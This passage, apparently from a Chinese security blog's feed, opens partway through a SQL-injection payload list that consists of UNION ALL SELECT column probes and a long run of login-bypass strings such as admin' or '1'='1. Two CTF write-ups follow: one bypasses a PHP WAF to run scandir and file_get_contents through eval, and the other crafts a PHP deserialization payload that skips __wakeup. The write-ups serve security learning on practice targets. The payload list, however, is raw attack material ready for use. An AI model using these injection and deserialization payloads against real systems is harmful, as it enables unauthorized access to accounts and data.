ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;#UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2#UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3#UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4#UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5#UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6#UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7#UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8#UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9#UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10#UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11#UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12#UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13#UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14#UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15#UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x05-SQL-注入身份验证绕过有效负载"><a href="#0x05-SQL-注入身份验证绕过有效负载" class="headerlink" title="0x05 SQL 注入身份验证绕过有效负载"></a>0x05 SQL 注入身份验证绕过有效负载</h2><pre class="line-numbers language-none"><code class="language-none">&#39;-&#39;&#39; &#39;&#39;&amp;&#39;&#39;^&#39;&#39;*&#39;&#39; or &#39;&#39;-&#39;&#39; or &#39;&#39; &#39;&#39; or &#39;&#39;&amp;&#39;&#39; or &#39;&#39;^&#39;&#39; or &#39;&#39;*&#39;&quot;-&quot;&quot; &quot;&quot;&amp;&quot;&quot;^&quot;&quot;*&quot;&quot; or &quot;&quot;-&quot;&quot; or &quot;&quot; &quot;&quot; or &quot;&quot;&amp;&quot;&quot; or &quot;&quot;^&quot;&quot; or &quot;&quot;*&quot;or true--&quot; or true--&#39; or true--&quot;) or true--&#39;) or true--&#39; or &#39;x&#39;&#x3D;&#39;x&#39;) or (&#39;x&#39;)&#x3D;(&#39;x&#39;)) or ((&#39;x&#39;))&#x3D;((&#39;x&quot; or &quot;x&quot;&#x3D;&quot;x&quot;) or (&quot;x&quot;)&#x3D;(&quot;x&quot;)) or ((&quot;x&quot;))&#x3D;((&quot;xor 1&#x3D;1or 1&#x3D;1--or 1&#x3D;1#or 1&#x3D;1&#x2F;*admin&#39; --admin&#39; #admin&#39;&#x2F;*admin&#39; or &#39;1&#39;&#x3D;&#39;1admin&#39; or &#39;1&#39;&#x3D;&#39;1&#39;--admin&#39; or &#39;1&#39;&#x3D;&#39;1&#39;#admin&#39; or &#39;1&#39;&#x3D;&#39;1&#39;&#x2F;*admin&#39;or 1&#x3D;1 or &#39;&#39;&#x3D;&#39;admin&#39; or 1&#x3D;1admin&#39; or 1&#x3D;1--admin&#39; or 1&#x3D;1#admin&#39; or 1&#x3D;1&#x2F;*admin&#39;) or (&#39;1&#39;&#x3D;&#39;1admin&#39;) or (&#39;1&#39;&#x3D;&#39;1&#39;--admin&#39;) or (&#39;1&#39;&#x3D;&#39;1&#39;#admin&#39;) or (&#39;1&#39;&#x3D;&#39;1&#39;&#x2F;*admin&#39;) or &#39;1&#39;&#x3D;&#39;1admin&#39;) or &#39;1&#39;&#x3D;&#39;1&#39;--admin&#39;) or &#39;1&#39;&#x3D;&#39;1&#39;#admin&#39;) or &#39;1&#39;&#x3D;&#39;1&#39;&#x2F;*1234 &#39; AND 1&#x3D;0 UNION ALL SELECT &#39;admin&#39;, &#39;81dc9bdb52d04dc20036dbd8313ed055admin&quot; --admin&quot; #admin&quot;&#x2F;*admin&quot; or &quot;1&quot;&#x3D;&quot;1admin&quot; or &quot;1&quot;&#x3D;&quot;1&quot;--admin&quot; or &quot;1&quot;&#x3D;&quot;1&quot;#admin&quot; or &quot;1&quot;&#x3D;&quot;1&quot;&#x2F;*admin&quot;or 1&#x3D;1 or &quot;&quot;&#x3D;&quot;admin&quot; or 1&#x3D;1admin&quot; or 1&#x3D;1--admin&quot; or 1&#x3D;1#admin&quot; or 1&#x3D;1&#x2F;*admin&quot;) or (&quot;1&quot;&#x3D;&quot;1admin&quot;) or (&quot;1&quot;&#x3D;&quot;1&quot;--admin&quot;) or (&quot;1&quot;&#x3D;&quot;1&quot;#admin&quot;) or (&quot;1&quot;&#x3D;&quot;1&quot;&#x2F;*admin&quot;) or &quot;1&quot;&#x3D;&quot;1admin&quot;) or &quot;1&quot;&#x3D;&quot;1&quot;--admin&quot;) or &quot;1&quot;&#x3D;&quot;1&quot;#admin&quot;) or &quot;1&quot;&#x3D;&quot;1&quot;&#x2F;*1234 &quot; AND 1&#x3D;0 UNION ALL SELECT &quot;admin&quot;, &quot;81dc9bdb52d04dc20036dbd8313ed055<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUU-[RoarCTF2019]Easy-Calc</title>
      <link href="/2022/07/24/BUU-RoarCTF2019-Easy-Calc/"/>
      <url>/2022/07/24/BUU-RoarCTF2019-Easy-Calc/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>BUU一道PHP解析特性题目。</p><h2 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h2><p><strong>原理1：利用PHP的字符串解析特性</strong></p><p>参考文章：<br><a href="https://www.freebuf.com/articles/web/213359.html">https://www.freebuf.com/articles/web/213359.html</a></p><blockquote><p>PHP将查询字符串（在URL或正文中）转换为内部<code>$_GET</code>或关联数组<code>$_POST</code>。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。<br>例如：<br>&#x2F;?foo&#x3D;bar变成Array([foo]&#x3D;&gt; “bar”)。<br>&#x2F;? foo&#x3D;bar变成Array([foo]&#x3D;&gt; “bar”)。 &#x2F;&#x2F;?号后有一个空格<br>&#x2F;?+foo&#x3D;bar变成Array([foo]&#x3D;&gt; “bar”)。 &#x2F;&#x2F;?号后有一个+号</p></blockquote><p><img src="/2022/07/24/BUU-RoarCTF2019-Easy-Calc/image-20220724095523999.png" alt="image-20220724095523999"></p><p><strong>原理2：利用scandir()列出目录和文件,var_dump()用于输出</strong></p><blockquote><p><code>scandir()函数返回指定目录中的文件和目录的数组。</code><br><code>scandir(/)相当于ls /</code><br><code>var_dump()相当于echo</code></p></blockquote><p><strong>原理3：利用file_get_contents()读取并输出文件内容</strong></p><blockquote><p><code>file_get_contents(/flag.php)</code>，读取<code>/flag.php</code>的代码</p></blockquote><h2 id="0x02-访问靶场"><a href="#0x02-访问靶场" class="headerlink" title="0x02 访问靶场"></a>0x02 访问靶场</h2><p>给出一个计算器，随便测试一下看源码：</p><p><img src="/2022/07/24/BUU-RoarCTF2019-Easy-Calc/image-20220724095741669.png" alt="image-20220724095741669"></p><p><img src="/2022/07/24/BUU-RoarCTF2019-Easy-Calc/image-20220724095811917.png" alt="image-20220724095811917"></p><p><img src="/2022/07/24/BUU-RoarCTF2019-Easy-Calc/image-20220724095831395.png" alt="image-20220724095831395"></p><p>告诉设置了一个WAF来确保安全，并且给了calc.php文件。</p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>先访问calc.php文件：<br><img src="/2022/07/24/BUU-RoarCTF2019-Easy-Calc/image-20220724100017460.png" alt="image-20220724100017460"></p><p>给出了源码；大概意思就算是使用GET方式传入一个num，并且对num的进行黑名单过滤，最后eval()执行。</p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>num传入字符：</p><p><img src="/2022/07/24/BUU-RoarCTF2019-Easy-Calc/image-20220724100218781.png" alt="image-20220724100218781"></p><p>看到直接被禁止访问，说明第一个源码给的WAf起作用了。</p><p>传入数字：<br><img src="/2022/07/24/BUU-RoarCTF2019-Easy-Calc/image-20220724100751914.png" alt="image-20220724100751914"></p><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><blockquote><p>说明在解析calc.php?num&#x3D;xxx时会检测num的值是否是数字，那这里利用<strong>原理1</strong>：PHP的字符串解析特性：在num前加入干扰字符，使WAF检测时候检测不到num值即可绕过WAF，但是php在解析时会去掉干扰字符，继续正常执行，最终达到上传非法字符的目的。</p></blockquote><p>在<code>?</code>和<code>num</code>之间加入空格，上传字符a，成功执行：</p><p><img src="/2022/07/24/BUU-RoarCTF2019-Easy-Calc/image-20220724101148165.png" alt="image-20220724101148165"></p><p>接下来利用<strong>原理2</strong>读取目录：</p><pre class="line-numbers language-none"><code class="language-none">? num&#x3D;var_dump(scandir(chr(47)))相当于? num&#x3D;system(ls &#x2F;) #chr(47)&#x3D;&quot; &#x2F; &quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/07/24/BUU-RoarCTF2019-Easy-Calc/image-20220724101431358.png" alt="image-20220724101431358"></p><p><img src="/2022/07/24/BUU-RoarCTF2019-Easy-Calc/image-20220724101424603.png" alt="image-20220724101424603"></p><p>找到flag所在文件名，利用<code>原理3</code>读文件内容：</p><pre class="line-numbers language-none"><code class="language-none">? num&#x3D;file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))&#x3D;&#x3D;&gt;&gt;file_get_contents(&#x2F;f1agg)相当于? num&#x3D;system(cat &#x2F;f1agg)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>这里&#x2F;&#x3D;chr(47)，f&#x3D;chr(102)，l&#x3D;chr(49)，a&#x3D;chr(97)，g&#x3D;chr(103)，g&#x3D;chr(103)来进行绕过</p></blockquote><p><img src="/2022/07/24/BUU-RoarCTF2019-Easy-Calc/image-20220724101710457.png" alt="image-20220724101710457"></p><p><img src="/2022/07/24/BUU-RoarCTF2019-Easy-Calc/image-20220724101716646.png" alt="image-20220724101716646"></p><p>拿到flag。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUU-[极客大挑战2019]PHP</title>
      <link href="/2022/07/23/BUU-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-PHP/"/>
      <url>/2022/07/23/BUU-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-PHP/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>BUU一道PHP反序列化题目。</p><h2 id="0x01-访问靶场"><a href="#0x01-访问靶场" class="headerlink" title="0x01 访问靶场"></a>0x01 访问靶场</h2><p>打开靶场，提示有备份网站的好习惯，猜测有备份网站的文件</p><p><img src="/2022/07/23/BUU-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-PHP/image-20220723234627619.png" alt="image-20220723234627619"></p><p>直接扫目录得到<a href="http://www.zip文件，解压：">www.zip文件，解压：</a><br><img src="/2022/07/23/BUU-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-PHP/image-20220723234910757.png" alt="image-20220723234910757"></p><h2 id="0x02-代码审计"><a href="#0x02-代码审计" class="headerlink" title="0x02 代码审计"></a>0x02 代码审计</h2><p>查看index.php和class.php这两个主文件即可：</p><p>index.php：<br><img src="/2022/07/23/BUU-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-PHP/image-20220723235115548.png" alt="image-20220723235115548"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span> <span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">;</span><span class="token variable">$select</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'select'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$res</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span>@<span class="token variable">$select</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>看到<code>unserialize()</code>函数，应该存在反序列化漏洞。</p><p>class.php：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Name</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'yesyes'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>NO!!!hacker!!!&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You name is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You password is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>hello my friend~~&lt;/br>sorry i can't give you the flag!"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看到class.php文件就可以确定是有类的反序列化题目了。</p><p>只要username&#x3D;&#x3D;&#x3D;’admin’即可输出flag。</p><h2 id="0x03-常用的内置方法"><a href="#0x03-常用的内置方法" class="headerlink" title="0x03 常用的内置方法"></a>0x03 常用的内置方法</h2><p>涉及函数：</p><pre class="line-numbers language-none"><code class="language-none">_construct()：创建对象时初始化，当一个对象创建时被调用_wakeup() 使用unserialize时触发_sleep() 使用serialize时触发_destruction()：结束时销毁对象，当一个对象销毁时被调用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x04-构造payload"><a href="#0x04-构造payload" class="headerlink" title="0x04 构造payload"></a>0x04 构造payload</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Name</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'yesyes'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Name</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造payload时候按照class类中的格式照抄，不要进行修改，否则会出错，由于最终需要使$username&#x3D;&#x3D;&#x3D;’admin’，声明Name对象时候直接传参即可，最后再进行序列化即可。</p><p><img src="/2022/07/23/BUU-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-PHP/image-20220724000205546.png" alt="image-20220724000205546"></p><pre class="line-numbers language-none"><code class="language-none">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输出结果中Name和username，Name和password之间是有不可见字符的，因为private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上ascii为0的字符（不可见字符）。</p><blockquote><p>这里尝试将private修改为public，但最后得到的payload拿不到flag，会出错，只能使用private进行构造。</p></blockquote><p>之后还需要绕过_wakeup方法：</p><p><strong>在反序列化字符串时，属性个数的值大于实际属性个数时，会跳过 _wakeup()函数的执行</strong></p><pre class="line-numbers language-none"><code class="language-none">原payload：O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;绕过：O:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>之后需要还需要将输出的不可见字符变为%00：</p><pre class="line-numbers language-none"><code class="language-none">?select&#x3D;O:4:%22Name%22:3:&#123;s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/07/23/BUU-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-PHP/image-20220724001016682.png" alt="image-20220724001016682"></p><p><img src="/2022/07/23/BUU-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-PHP/image-20220724001027452.png" alt="image-20220724001027452"></p><p>拿到flag。</p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 